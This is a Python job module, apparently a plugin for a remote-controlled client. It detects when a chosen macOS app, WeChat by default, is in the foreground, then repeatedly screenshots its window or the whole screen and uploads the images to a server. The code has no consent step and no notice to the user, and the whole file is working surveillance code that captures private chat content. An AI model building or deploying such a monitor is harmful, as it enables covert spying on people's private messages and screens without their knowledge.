JOB_METADATA = {
    "name": "app_screenshot_monitor",
    "display_name": "App Screenshot Monitor",
    "description": "Capture screenshots when a target macOS app is foreground",
    "platforms": ["darwin"],
    "params": [
        {
            "name": "target_app",
            "type": "string",
            "required": False,
            "default": "WeChat",
            "description": "Target application name"
        },
        {
            "name": "interval_seconds",
            "type": "integer",
            "required": False,
            "default": 10,
            "min": 1,
            "description": "Capture interval in seconds while foreground"
        },
        {
            "name": "mode",
            "type": "string",
            "required": False,
            "default": "window",
            "description": "Screenshot mode: window or fullscreen"
        }
    ]
}

import os
import threading
import time
import tempfile

from client.jobs.core.job import Job
from core.utils.artifact_naming import build_artifact_filename
from core.artifact_contract import ArtifactOrigin
from core.utils.logger import logger


class AppScreenshotMonitor(Job):
    """
    应用截图监控器
    mode: 'window' - 只截应用窗口，'fullscreen' - 全屏截图
    """
    def __init__(self, target_app='WeChat', interval=10, mode='window'):
        super().__init__()
        self.target_app = target_app
        self.interval = interval
        self.mode = mode  # 'window' or 'fullscreen'
        self.is_foreground = False
        self.last_screenshot_time = 0
        self.screenshot_count = 0

    def on_context_bound(self):
        self.target_app = str(self.get_job_param('target_app', 'WeChat') or 'WeChat').strip() or 'WeChat'
        self.interval = int(self.get_job_param('interval_seconds', 10) or 10)
        mode = str(self.get_job_param('mode', 'window') or 'window').strip().lower()
        self.mode = mode if mode in ('window', 'fullscreen') else 'window'

    def run(self):
        try:
            time.sleep(2)
            self.send_to_server(1, f'{self.target_app} screenshot monitor started', 0)
            self.send_to_server(1, f'Mode: {self.mode}, Interval: {self.interval}s', 0)

            try:
                import pyautogui
                from Quartz import (
                    CGWindowListCopyWindowInfo,
                    kCGWindowListOptionOnScreenOnly,
                    kCGNullWindowID
                )
                self.send_to_server(1, 'Libraries loaded', 0)
            except ImportError as e:
                self.send_to_server(0, f'Import error: {e}', 0)
                self.mark_stopped()
                return

            self.mark_running()

            while not self.stop_event.is_set():
                current_foreground = self._is_app_foreground(self.target_app)

                if current_foreground != self.is_foreground:
                    self.is_foreground = current_foreground
                    if self.is_foreground:
                        self.send_to_server(1, f'{self.target_app} switched to foreground', 0)
                        self._take_screenshot()
                        self.last_screenshot_time = time.time()
                    else:
                        self.send_to_server(1, f'{self.target_app} switched to background', 0)

                if self.is_foreground:
                    current_time = time.time()
                    if current_time - self.last_screenshot_time >= self.interval:
                        self._take_screenshot()
                        self.last_screenshot_time = current_time

                time.sleep(1)

            self.send_to_server(1, f'{self.target_app} screenshot monitor stopped', 0)
        except Exception as e:
            self.send_to_server(0, f'Monitor error: {e}', 0)
        finally:
            self.mark_stopped()
            logger.info(f'Thread ended: {threading.current_thread().name}')
            self.send_to_server(1, f'Task ended: {threading.current_thread().name}', 1)

    def stop(self, notify: bool = True):
        self.request_stop(notify=notify)

    def _get_frontmost_app(self):
        """获取当前最前端的应用名称"""
        try:
            from Quartz import (
                CGWindowListCopyWindowInfo,
                kCGWindowListOptionOnScreenOnly,
                kCGNullWindowID
            )

            windows = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID)

            for window in windows:
                layer = window.get('kCGWindowLayer', 999)
                if layer == 0:
                    return window.get('kCGWindowOwnerName', '')
            return None
        except:
            return None

    def _is_app_foreground(self, app_name):
        """检查指定应用是否在前台"""
        try:
            frontmost_app = self._get_frontmost_app()
            return frontmost_app and app_name.lower() in frontmost_app.lower()
        except:
            return False

    def _get_main_window_bounds(self, app_name):
        """获取应用主窗口的 bounds"""
        try:
            from Quartz import (
                CGWindowListCopyWindowInfo,
                kCGWindowListOptionOnScreenOnly,
                kCGNullWindowID
            )

            windows = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID)

            matching_windows = []
            for window in windows:
                owner = window.get('kCGWindowOwnerName', '')
                layer = window.get('kCGWindowLayer', 999)
                name = window.get('kCGWindowName', '')

                if owner and app_name.lower() in owner.lower() and layer == 0:
                    if name not in ('Menubar', 'Dock', 'Item-0', 'Focus Proxy', ''):
                        bounds = window.get('kCGWindowBounds', {})
                        if bounds:
                            x = bounds.get('X', 0)
                            y = bounds.get('Y', 0)
                            width = bounds.get('Width', 0)
                            height = bounds.get('Height', 0)

                            if width > 100 and height > 100:
                                matching_windows.append({
                                    'x': int(x),
                                    'y': int(y),
                                    'width': int(width),
                                    'height': int(height),
                                    'name': name
                                })

            if not matching_windows:
                return None

            matching_windows.sort(key=lambda w: w['width'] * w['height'], reverse=True)
            return matching_windows[0]

        except Exception as e:
            return None

    def _screenshot_window(self, bounds):
        """截图窗口"""
        try:
            import pyautogui

            screenshot = pyautogui.screenshot(
                region=(bounds['x'], bounds['y'], bounds['width'], bounds['height'])
            )

            temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
            temp_file.close()
            screenshot.save(temp_file.name)

            if os.path.exists(temp_file.name) and os.path.getsize(temp_file.name) > 0:
                return temp_file.name
            return None

        except Exception as e:
            return None

    def _screenshot_fullscreen(self):
        """全屏截图"""
        try:
            import pyautogui

            screenshot = pyautogui.screenshot()

            temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
            temp_file.close()
            screenshot.save(temp_file.name)

            if os.path.exists(temp_file.name) and os.path.getsize(temp_file.name) > 0:
                return temp_file.name
            return None

        except Exception as e:
            return None

    def _take_screenshot(self):
        """统一截图入口，根据 mode 选择截图方式"""
        try:
            # 再次确认应用在前台
            if not self._is_app_foreground(self.target_app):
                self.send_to_server(1, f'{self.target_app} no longer foreground, skip', 0)
                return

            screenshot_path = None

            if self.mode == 'window':
                # 窗口模式：获取窗口 bounds 并截图
                bounds = self._get_main_window_bounds(self.target_app)

                if bounds:
                    self.send_to_server(
                        1,
                        f'Window: {bounds["width"]}x{bounds["height"]} at ({bounds["x"]}, {bounds["y"]})',
                        0
                    )
                    screenshot_path = self._screenshot_window(bounds)
                else:
                    # 获取窗口失败，降级为全屏截图
                    self.send_to_server(1, 'Cannot get window bounds, fallback to fullscreen', 0)
                    screenshot_path = self._screenshot_fullscreen()

            else:  # fullscreen 模式
                screenshot_path = self._screenshot_fullscreen()

            if not screenshot_path:
                self.send_to_server(0, 'Failed to capture screenshot', 0)
                return

            try:
                file_size = os.path.getsize(screenshot_path)
                mode_text = 'Window' if self.mode == 'window' else 'Fullscreen'
                self.send_to_server(1, f'{mode_text} captured ({file_size} bytes)', 0)

                filename = build_artifact_filename('screenshot', 'png')
                self.upload_file_via_http(
                    screenshot_path, 'app_screenshot', filename=filename,
                    extra={'origin': ArtifactOrigin.JOB.value},
                )

                self.screenshot_count += 1
                self.send_to_server(1, f'Uploaded (total: {self.screenshot_count})', 0)

            finally:
                try:
                    os.unlink(screenshot_path)
                except:
                    pass

        except Exception as e:
            self.send_to_server(0, f'Screenshot failed: {e}', 0)